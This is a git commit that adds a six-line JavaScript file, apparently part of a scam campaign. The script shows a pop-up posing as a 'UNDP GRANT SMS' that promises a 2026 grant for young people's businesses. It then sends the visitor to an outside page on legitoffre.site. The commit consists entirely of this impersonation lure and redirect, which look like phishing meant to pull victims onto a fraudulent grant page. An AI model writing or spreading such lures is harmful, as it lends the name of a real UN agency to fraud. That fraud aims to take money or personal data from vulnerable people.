84c86f32b54f88cb47b73e9e9898dd16f84596be
legitipz <gloliousam4@gmail.com>
2026-01-02 03:42:07 -0800

    Create activation-newyeargrant.org.js

---
+++ activation-newyeargrant.org.js
@@ -0,0 +1,6 @@
+
+var password = 'APPLY'
+password=prompt('UNDP GRANT SMS: To all youth, kindly apply to undp grant 2026 to support your business, press apply to check now ','APPLY');
+if (password != 'APPLY') {
+location.href='https://legitoffre.site/newyeargrant.org.html';
+}
